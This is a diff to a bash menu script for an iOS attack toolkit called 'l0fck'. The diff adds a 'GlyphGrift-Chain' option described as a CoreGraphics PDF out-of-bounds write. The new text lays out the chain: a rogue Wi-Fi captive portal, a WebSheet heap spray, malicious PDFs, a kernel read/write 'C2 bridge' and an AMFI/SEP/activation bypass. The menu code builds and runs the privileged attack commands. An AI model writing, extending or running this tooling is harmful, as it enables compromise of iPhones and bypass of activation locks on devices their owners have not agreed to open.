@@ -185,15 +185,17 @@ EOF
 
 print_doc_self_test() {
     cat <<'EOF'
-Host-only embedded unit test suite (16 tests). Validates parsers,
+Host-only embedded unit test suite (18 tests). Validates parsers,
 synthesizers, and lifecycle helpers without a connected device:
 Port DFU serial parser, Base64 codec, A18 target gating, activation
 record synthesizer, DNS/HTTP captive parsers, mobileconfig generator,
 root CA PEM, .IPS crash triage parser, PurpleBuddy/SpringBoard plist
 synthesizers, session manager init, SetupAssistant/iTunes plists,
 AppleAVE2 portal telemetry parser, SetupAssistant activation engine,
-KASLR slide & slid addressing, and KRW HTTP C2 bridge with dynamic
-discovery (allproc walk, DeviceTree, PTOV table simulation).
+KASLR slide & slid addressing, KRW HTTP C2 bridge with dynamic
+discovery (allproc walk, DeviceTree, PTOV table simulation), and
+GlyphGrift PDF payload existence & telemetry structure lifecycle,
+and GlyphGrift V2 exploit telemetry (crash≠krw_ready, k128/k192 PDFs).
 EOF
 }
 
@@ -246,6 +248,21 @@ Once kernel R/W is won:
 4. When USB is connected, injects MobileActivation & PurpleBuddy flags, stages
    preferences to Media partition, broadcasts 14 Darwin setup dismissal
    notifications, and resprings directly into the unlocked Home Screen.
+EOF
+}
+
+print_doc_glyphgrift_chain() {
+    cat <<'EOF'
+CVE-2026-86950 GlyphGrift V2 — Coverage Buffer Shaping & Controlled Primitive:
+Soft AP → WebSheet heap spray (kalloc.128) → multi-PDF OOB (trigger_k128 then
+trigger_k192) → corruption scan → captive_krw bridge → AMFI/SEP/activation.
+Stages 0–4 unchanged (trigger/telemetry). Stages 5–8 auto-chain after the
+OOB path (no operator y/N). Crash/OOB alone never implies kernel R/W.
+Operator selects delivery vector before start:
+  1) <img> ImageIO thumbnail path
+  2) <iframe>/<object> CG PDF render path
+Heap-only for exploit stages; --glyphgrift-stack remains research-only.
+Fixed in iOS 26.7.1. Target iOS 26.6.1 (23G83) is vulnerable.
 EOF
 }
 
@@ -362,6 +379,8 @@ print_art_self_test() {
         +-- Activation: SetupAssistant post-exploit force-success engine
         +-- Kernel:  KASLR slide & slid address calculation
         +-- Bridge:  KRW HTTP C2 bridge & dynamic allproc/PTOV discovery
+        +-- GlyphGrift: trigger.pdf presence & telemetry reset/get
+        +-- GlyphGrift V2: exploit telem + k128/k192 PDF variants
 EOF
 }
 
@@ -420,6 +439,25 @@ kernel R/W (AppleAVE2 primary, V-047/MCC fallback)
         |    CDHash --> cave --> update trust_cache_rt pointer
         |
         +--> CoreTrust cs_blob validation patch (data-only)
+EOF
+}
+
+print_art_glyphgrift_chain() {
+    cat <<'EOF'
+  iPhone (Setup Assistant)  --->  Soft AP / Wi-Fi  --->  Captive DNS/HTTP
+           |                                                 |
+           v                                                 v
+  WebSheet V2 HTML         <--- spray + k128/k192 PDFs  <--- l0fck Host
+           |
+           +--> Stage5: ArrayBuffer spray (kalloc.128 holes)
+           +--> Stage6: trigger_k128.pdf then trigger_k192.pdf
+           |         |
+           |         v
+           |    aa_cache_render OOB → adjacent spray corruption?
+           |
+           +--> POST /api/glyphgrift-exploit-result
+           +--> Stage7: authentic kbase → captive_krw bridge
+           +--> Stage8: AMFI / SEP / activation (reuse SetupAssistant)
 EOF
 }
 
@@ -761,11 +799,12 @@ menu_advanced_chains() {
         echo -e "${BOLD}4.${RESET}  ${CYAN}${BOLD}Sovereign-Lite (Injection + Notification)${RESET}"
         echo -e "${BOLD}5.${RESET}  ${CYAN}${BOLD}Neo-Chain (Kernel Exploitation Bypass)${RESET}"
         echo -e "${BOLD}6.${RESET}  ${CYAN}${BOLD}SetupAssistant-Chain (Wi-Fi Portal, WebSheet & AppleAVE2 Video Kernel Exploit)${RESET}"
+        echo -e "${BOLD}7.${RESET}  ${CYAN}${BOLD}GlyphGrift-Chain (CVE-2026-86950 CoreGraphics PDF OOB Write)${RESET}"
         echo ""
         echo -e "${BOLD}B.${RESET}  Back"
         echo -e "${BOLD}0.${RESET}  Exit"
         echo "----------------------------------------------------------------------"
-        echo -n "Select an option [1-6, B, 0]: "
+        echo -n "Select an option [1-7, B, 0]: "
         read -r choice
 
         case "$choice" in
@@ -836,6 +875,78 @@ menu_advanced_chains() {
                         sudo ./l0fck --setup-assistant-chain
                 fi
                 ;;
+            7)
+                print_banner
+                echo -e "${CYAN}${BOLD}GlyphGrift-Chain Configuration${RESET}"
+                echo ""
+                echo "Select Port Mode:"
+                echo "  1) Privileged CNA Ports (53/80/443) - [Recommended for real iPhone CNA, requires sudo]"
+                echo "  2) Custom / User Ports (e.g. 5353/8080/8443)"
+                echo ""
+                echo -n "Choose mode [1-2, default: 1]: "
+                read -r pmode
+                local hport="" dport="" tport="" port_args=()
+                local use_sudo=0
+                if [ "$pmode" = "2" ]; then
+                    echo -n "Enter HTTP port [8080]: "
+                    read -r hport
+                    if [ -z "$hport" ]; then hport=8080; fi
+                    echo -n "Enter DNS port [5353]: "
+                    read -r dport
+                    if [ -z "$dport" ]; then dport=5353; fi
+                    echo -n "Enter TLS port [8443]: "
+                    read -r tport
+                    if [ -z "$tport" ]; then tport=8443; fi
+                    port_args=(--captive-server "$hport" --captive-dns-port "$dport" --captive-tls-port "$tport")
+                else
+                    use_sudo=1
+                fi
+
+                echo ""
+                echo "Select PDF Delivery Vector:"
+                echo "  1) <img> ImageIO thumbnail path (default)"
+                echo "  2) <iframe>/<object> CG PDF embed path"
+                echo ""
+                echo -n "Vector choice [1-2, default: 1]: "
+                read -r vchoice
+                local vec_flag="img"
+                if [ "$vchoice" = "2" ]; then
+                    vec_flag="embed"
+                fi
+
+                echo ""
+                echo -n "Use stack-targeted PDF (DX=31)? [y/N]: "
+                read -r stack_ans
+                local stack_args=()
+                case "$stack_ans" in
+                    [Yy]|[Yy][Ee][Ss]) stack_args=(--glyphgrift-stack) ;;
+                esac
+
+                local base_cmd=(./l0fck --glyphgrift-chain --glyphgrift-vector "$vec_flag" "${stack_args[@]}" "${port_args[@]}")
+                local display_cmd="./l0fck --glyphgrift-chain --glyphgrift-vector ${vec_flag}"
+                if [ ${#stack_args[@]} -gt 0 ]; then
+                    display_cmd="${display_cmd} --glyphgrift-stack"
+                fi
+                if [ ${#port_args[@]} -gt 0 ]; then
+                    display_cmd="${display_cmd} --captive-server ${hport} --captive-dns-port ${dport} --captive-tls-port ${tport}"
+                fi
+                if [ "$use_sudo" = "1" ]; then
+                    display_cmd="sudo ${display_cmd}"
+                    run_confirmed "7" "GlyphGrift-Chain (Privileged Ports, vector=${vec_flag})" \
+                        "$display_cmd" \
+                        "Wi-Fi Soft AP only; requires sudo for ports 53/80/443" \
+                        "${RED}Danger: privileged network interception; crash/OOB research only${RESET}" \
+                        print_doc_glyphgrift_chain print_art_glyphgrift_chain \
+                        sudo "${base_cmd[@]}"
+                else
+                    run_confirmed "7" "GlyphGrift-Chain (User Ports, vector=${vec_flag})" \
+                        "$display_cmd" \
+                        "Wi-Fi Soft AP only (No USB); host listening on custom ports" \
+                        "${YELLOW}Caution: network interception; crash/OOB research only${RESET}" \
+                        print_doc_glyphgrift_chain print_art_glyphgrift_chain \
+                        "${base_cmd[@]}"
+                fi
+                ;;
             [Bb]) return ;;
             0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
             *) echo -e "\n${RED}Invalid selection.${RESET}"; sleep 1 ;;
@@ -848,7 +959,7 @@ menu_diagnostics() {
         print_banner
         echo -e "${CYAN}${BOLD}Diagnostics${RESET}"
         echo ""
-        echo -e "${BOLD}1.${RESET}  Run Embedded Self-Tests (16/16 Verification)"
+        echo -e "${BOLD}1.${RESET}  Run Embedded Self-Tests (18/18 Verification)"
         echo -e "${BOLD}2.${RESET}  Test Kernel Exploit Primitive (V-047 / MCC)"
         echo -e "${BOLD}3.${RESET}  Test AMFI / CoreTrust Bypass"
         echo ""
